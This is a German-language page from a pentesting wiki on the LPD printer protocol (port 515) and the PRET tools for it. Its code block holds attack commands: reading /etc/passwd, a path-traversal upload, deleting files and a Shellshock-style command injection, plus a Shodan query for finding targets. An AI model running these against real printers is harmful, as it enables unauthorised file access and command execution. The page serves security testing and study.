{{#include ../banners/hacktricks-training.md}}

### **Einführung in das LPD-Protokoll**

In den 1980er Jahren wurde das **Line Printer Daemon (LPD) Protokoll** in Berkeley Unix entwickelt, das später durch RFC1179 formalisiert wurde. Dieses Protokoll arbeitet über den Port 515/tcp und ermöglicht Interaktionen über den `lpr`-Befehl. Das Wesentliche des Druckens über LPD besteht darin, eine **Steuerdatei** (um Auftragsdetails und Benutzer anzugeben) zusammen mit einer **Daten-Datei** (die die Druckinformationen enthält) zu senden. Während die Steuerdatei die Auswahl von **verschiedenen Dateiformaten** für die Daten-Datei ermöglicht, wird die Handhabung dieser Dateien durch die spezifische LPD-Implementierung bestimmt. Eine weithin anerkannte Implementierung für Unix-ähnliche Systeme ist **LPRng**. Bemerkenswerterweise kann das LPD-Protokoll ausgenutzt werden, um **bösartige PostScript**- oder **PJL-Druckaufträge** auszuführen.

### **Werkzeuge zur Interaktion mit LPD-Druckern**

[**PRET**](https://github.com/RUB-NDS/PRET) führt zwei wesentliche Werkzeuge ein, `lpdprint` und `lpdtest`, die eine einfache Methode bieten, um mit LPD-kompatiblen Druckern zu interagieren. Diese Werkzeuge ermöglichen eine Reihe von Aktionen, vom Drucken von Daten bis hin zur Manipulation von Dateien auf dem Drucker, wie z.B. Herunterladen, Hochladen oder Löschen:
```python
# To print a file to an LPD printer
lpdprint.py hostname filename
# To get a file from the printer
lpdtest.py hostname get /etc/passwd
# To upload a file to the printer
lpdtest.py hostname put ../../etc/passwd
# To remove a file from the printer
lpdtest.py hostname rm /some/file/on/printer
# To execute a command injection on the printer
lpdtest.py hostname in '() {:;}; ping -c1 1.2.3.4'
# To send a mail through the printer
lpdtest.py hostname mail lpdtest@mailhost.local
```
Für Personen, die daran interessiert sind, den Bereich des **Printer-Hackings** weiter zu erkunden, kann hier eine umfassende Ressource gefunden werden: [**Hacking Printers**](http://hacking-printers.net/wiki/index.php/Main_Page).

# Shodan

- `port 515`

{{#include ../banners/hacktricks-training.md}}
